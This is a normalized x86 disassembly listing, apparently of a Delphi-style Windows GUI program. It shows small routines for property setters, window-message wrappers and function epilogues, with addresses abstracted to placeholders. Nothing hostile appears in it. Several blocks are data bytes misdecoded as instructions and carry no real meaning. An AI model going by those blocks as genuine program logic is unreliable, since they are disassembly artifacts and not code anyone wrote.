sub [ rw-data ] 0x1
retn
sub_433e48
jmp sub_403924
sub_433e4f
pop ebp
retn
sub_433e54
sub [ rw-data ] 0x1
retn
sub_433e81
jmp sub_403924
sub_433e88
pop ebp
retn
sub_433e8c
sub [ rw-data ] 0x1
retn
sub_43429a
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add al bl
mov eax [ ebx ]
pop esp
cmp [ ebp ] eax
hlt
sub_4344c6
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add al bl
mov eax [ ebx ]
pop esp
cmp [ ebp ] eax
hlt
sub_436932
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ ebp + ebp * 4 - 0x3a6bffbd ] ah
inc esp
add al ch
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_436a86
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ ebp + ebp * 4 - 0x3a6bffbd ] ah
inc esp
add al ch
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_437d48
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c0b4
mov [ rw-data ] eax
sub_437e70
cmp dl [ eax + 0x16 ]
je r-xdata
retn
mov [ eax + 0x16 ] dl
mov [ eax + 0x17 ] 0x0
xor edx edx
call sub_418e44
sub_437e84
mov al [ eax + 0x17 ]
xor al 0x1
retn
sub_437e8c
cmp dl [ eax + 0x17 ]
je r-xdata
retn
mov [ eax + 0x17 ] dl
call sub_437e9c
sub_437ed4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x16 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_437f28
cmp dl [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] dl
xor edx edx
call sub_418e44
sub_437f38
cmp dl [ eax + 0x15 ]
je r-xdata
retn
mov [ eax + 0x15 ] dl
xor edx edx
call sub_418e44
sub_437f48
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
xor edx edx
call sub_418e44
sub_437ff0
push ebx
mov ebx eax
mov eax ebx
call sub_419058
pop ebx
retn
sub_438010
mov eax [ eax + 0x18 ]
retn
sub_438298
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4385ae
jmp sub_403924
sub_438614
cmp dl [ eax + 0x215 ]
je r-xdata
retn
mov [ eax + 0x215 ] dl
mov dl 0x1
call sub_438c04
sub_4387bc
jmp sub_403924
sub_4387c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438a1a
jmp sub_403924
sub_438a21
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_438a30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_4041e0
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_438a8c
cmp [ eax + 0x217 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x59 ] 0x0
jne r-xdata
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_438ad8
push ebx
mov ebx eax
mov eax ebx
call sub_452fbc
mov eax ebx
call sub_451028
pop ebx
retn
sub_438aec
push ebx
mov ebx eax
mov eax ebx
call sub_44ee5c
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov [ ebx + 0x217 ] 0x0
sub_438b88
push ebx
mov ebx eax
mov eax ebx
call sub_453120
mov eax ebx
call sub_451028
pop ebx
retn
sub_438b9c
push ebx
mov ebx eax
mov eax ebx
call sub_4531b0
mov eax ebx
call sub_43862c
pop ebx
retn
sub_438bb0
push ebx
mov ebx ecx
cmp [ eax + 0x217 ] 0x0
je r-xdata
mov ecx ebx
call sub_453594
pop ebx
retn
mov cl [ r-xdata ]
mov [ eax + 0x98 ] cl
sub_438bfc
call sub_44d060
retn
sub_438ccc
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437f90
retn
sub_438cdc
mov eax [ r-xdata ]
retn
sub_438e18
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_418e44
sub_438e2c
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_438e34
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_438e44
sub_438e7c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_438e94
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_438ed0
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_418e44
sub_438f00
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_438f78
retn
mov edx 0x2710
sub_438f24
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_438f78
retn
mov edx ecx
sub_438f40
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_418e44
sub_438fc0
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_418e44
sub_439014
or ecx 0xffffffff
xor edx edx
call sub_439064
retn
sub_439034
mov eax [ eax + 0x18 ]
retn
sub_4392dc
jmp sub_403924
sub_4393fe
jmp sub_403924
sub_439405
mov eax [ ebp - 0x4 ]
call sub_450e24
pop ecx
pop ecx
pop ebp
retn
sub_4395ba
jmp sub_403924
sub_439658
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_439678
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_4396c4
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_451028
sub_4396d8
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_451028
sub_4396ec
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_451028
sub_439700
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_451028
sub_439714
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4399c1
jmp sub_403924
sub_4399c8
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_439b6e
jmp sub_403924
sub_439f5a
jmp sub_403924
sub_439f77
jmp sub_403924
sub_439f88
push ebx
mov ebx eax
mov eax ebx
call sub_451f64
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43a1d8
jmp sub_403924
sub_43a1df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a202
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050e0
retn
sub_43a1fb
jmp sub_403924
sub_43a202
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a264
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_43a2bc
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_438fd0
retn
sub_43a538
call sub_450e24
retn
sub_43a7ba
jmp sub_403924
sub_43a7c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43a7cc
mov ecx [ eax + 0x220 ]
push ecx
mov ecx [ eax + 0x21c ]
call sub_43a644
retn
sub_43a7e0
mov ecx [ eax + 0x220 ]
cmp edx ecx
jg r-xdata
retn
push ecx
mov ecx [ eax + 0x228 ]
xchg edx ecx
call sub_43a644
sub_43a7fc
mov ecx [ eax + 0x21c ]
cmp edx ecx
jl r-xdata
retn
push edx
mov edx [ eax + 0x228 ]
call sub_43a644
sub_43a850
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_451028
sub_43a864
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_451028
sub_43a928
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_451028
sub_43a9a0
cmp edx [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] edx
call sub_43a93c
sub_43a9b4
cmp edx [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] edx
call sub_43a93c
sub_43a9c8
push ebx
cmp [ eax + 0x23a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x23c ]
call [ ebx + 0x238 ]
sub_43ac48
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43ac5c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_43ada4
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_43aef4
sub_43b1e1
jmp sub_403924
sub_43b1e8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b39c
retn
sub_43b4a1
jmp sub_403924
sub_43b4a8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43b594
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43b5b0
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43b5cc
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43b5e8
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43b681
jmp sub_403670
sub_43b904
jmp sub_403924
sub_43b90b
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ba40
jmp sub_403924
sub_43ba47
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43bc80
mov edx [ eax ]
or edx [ eax + 0x4 ]
or edx [ eax + 0x8 ]
or edx [ eax + 0xc ]
sete al
retn
sub_43bdd6
jmp sub_403924
sub_43bddd
push 0x6
call GetSystemMetrics
mov edx eax
shl edx 0x3
add edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_44c96c
pop ebx
mov esp ebp
pop ebp
retn
sub_43bdfc
cmp [ eax + 0x269 ] 0x0
jne r-xdata
mov [ eax + 0x252 ] 0x0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_43bed6
add [ eax ] al
push ebx
cmp [ eax + 0x282 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
sub_43bf40
push ebx
mov ebx eax
mov eax ebx
call sub_452fbc
push 0xffffffff
push 0x0
mov eax ebx
call sub_453a88
push eax
call InvalidateRect
pop ebx
retn
sub_43c196
jmp sub_403924
sub_43c19d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c1a4
push ebx
mov ebx eax
mov eax ebx
call sub_453a88
call sub_42ae5c
pop ebx
retn
sub_43c1b8
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43c2a4
jmp sub_403924
sub_43c2ec
cmp dl [ eax + 0x250 ]
je r-xdata
retn
mov [ eax + 0x250 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
sete cl
mov edx 0x20
call sub_437d80
sub_43c364
cmp dl [ eax + 0x253 ]
je r-xdata
retn
mov [ eax + 0x253 ] dl
call sub_451028
sub_43c378
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_451028
sub_43c38c
cmp dl [ eax + 0x256 ]
je r-xdata
retn
mov [ eax + 0x256 ] dl
call sub_451028
sub_43c3a0
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx edx
mov edx 0x10
call sub_437d80
sub_43c3c4
cmp dl [ eax + 0x269 ]
je r-xdata
retn
mov [ eax + 0x269 ] dl
call sub_451028
sub_43c4b8
mov ecx [ eax + 0x220 ]
mov [ edx ] ecx
mov ecx [ eax + 0x224 ]
mov [ edx + 0x4 ] ecx
retn
sub_43c4cc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x220 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x224 ] edx
pop ebp
retn 0x8
sub_43c4e8
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_43c4fc
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43c510
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_43c524
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_43c538
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_43c554
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43c570
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_43c58c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_43c617
jmp sub_403924
sub_43c61e
pop ebp
retn
sub_43c620
sub [ rw-data ] 0x1
retn
sub_43c68f
jmp [ edi ]
sub_43c930
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43c948
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43c98c
push ebx
mov ebx eax
mov eax ebx
call sub_43d348
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43d337
jmp sub_403924
sub_43d348
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42d4c0
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43c95c
sub_43d39f
jmp sub_403924
sub_43d3a6
pop ebp
retn
sub_43d3a8
sub [ rw-data ] 0x1
retn
sub_43d5ee
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_43d732
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_43de26
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ eax - 0x6bffbbe6 ] bh
lds eax [ eax + eax - 0x18 ]
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_43de4a
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
hlt
sub_43dfe2
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ eax - 0x6bffbbe6 ] bh
lds eax [ eax + eax - 0x18 ]
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_43e006
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
hlt
sub_440c34
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_440f0f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x60d172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4412ca
jmp sub_403924
sub_4412d1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441356
jmp sub_403924
sub_44135d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441364
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_450348
pop ebx
retn
sub_441378
push ebx
mov ebx eax
mov eax ebx
call sub_4530a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_450348
pop ebx
retn
sub_441394
push ebx
mov ebx eax
mov eax ebx
call sub_452074
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_441440
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d18c
pop esi
pop ebx
retn
sub_4415aa
jmp sub_403924
sub_4415b1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4416c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f248
mov eax ebx
mov si 0xffc7
call sub_40338c
pop esi
pop ebx
retn
sub_4417ac
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4417c8
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_40338c
sub_4417e4
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4417f0
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_420824
sub_441804
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441864
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4418d8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_40338c
pop esi
pop ebx
retn
sub_4418f4
push esi
mov esi eax
mov eax esi
call sub_44ed54
mov eax esi
mov si 0xffc7
call sub_40338c
pop esi
retn
sub_441999
jmp sub_403924
sub_4419a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4419a8
push ebx
mov ebx eax
mov eax ebx
call sub_44eeb8
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_4419cc
push ebx
mov ebx eax
mov eax ebx
call sub_44eed0
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_441ab8
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_4420e0
sub_441acc
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_4420e0
mov eax ebx
call sub_451028
sub_441af0
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_451028
sub_441b04
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_451028
sub_441b48
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_451028
sub_441c49
jmp sub_403924
sub_441c50
pop ebx
pop ecx
pop ebp
retn
sub_441d68
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_453a88
push eax
call SetWindowTextA
pop ebx
retn
sub_441d84
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_441da0
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_441e46
jmp sub_403924
sub_441e4d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441ee6
jmp sub_403924
sub_44205f
jmp sub_403924
sub_4420c4
push ebx
mov ebx eax
mov eax ebx
call sub_441b5c
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_450e24
pop ebx
retn
sub_4421c4
push ebx
mov ebx eax
mov eax ebx
call sub_44cd98
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4422bc
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_40338c
sub_44236c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_4423ee
jmp sub_403924
sub_4423f5
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4424e0
jmp sub_403924
sub_4424e7
pop ebx
pop ecx
pop ebp
retn
sub_4425db
jmp sub_403924
sub_4425e2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44265f
jmp sub_403924
sub_442666
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4427bc
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_44d168
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_44280c
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_442940
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_451028
sub_442974
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44297c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_442984
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4429b0
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44e340
sub_442b08
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_442b28
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_451028
sub_442df3
jmp sub_403670
sub_442df8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_443084
jmp sub_403924
sub_44308b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443094
push ebx
mov ebx eax
mov eax ebx
call sub_44cd98
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_443161
jmp sub_403924
sub_443168
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_443174
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_4431f0
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_44330a
jmp sub_403924
sub_443354
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_4433df
jmp sub_403924
sub_4433e6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443418
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_443424
mov [ eax + 0x210 ] edx
retn
sub_443475
jmp sub_403924
sub_44347c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443544
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_451028
sub_443598
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_4435ad
mov eax [ eax + 0x238 ]
retn
sub_4435ad
push 0x0
xor ecx ecx
mov edx 0x154
call sub_44e340
retn
sub_4438ec
jmp sub_403924
sub_4438f3
pop ebx
mov esp ebp
pop ebp
retn
sub_443cb0
jmp sub_403924
sub_443cb7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443e75
jmp sub_403924
sub_443e7c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443e88
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_44406c
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_444078
mov eax [ r-xdata ]
retn
sub_4442a9
jmp sub_403924
sub_4442b8
retn
sub_44436e
jmp sub_403924
sub_444418
mov eax [ r-xdata ]
retn
sub_444420
xor eax eax
retn
sub_444444
retn
sub_44455c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_451028
sub_4445d4
push ebx
mov ebx eax
mov eax ebx
call sub_464518
test eax eax
je r-xdata
mov eax ebx
call sub_44e6c8
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4445f8
xor eax eax
retn
sub_4446bf
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3c89173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4446d8
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_40338c
sub_4447c9
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_4447d2
jmp sub_403924
j_sub_4447c9
jmp sub_4447c9
sub_4447d9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44490c
mov al [ eax + 0x211 ]
retn
sub_444940
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_451028
sub_444b20
call sub_451028
retn
sub_444b9d
jmp sub_403924
sub_444ba4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444bdc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_453a88
push eax
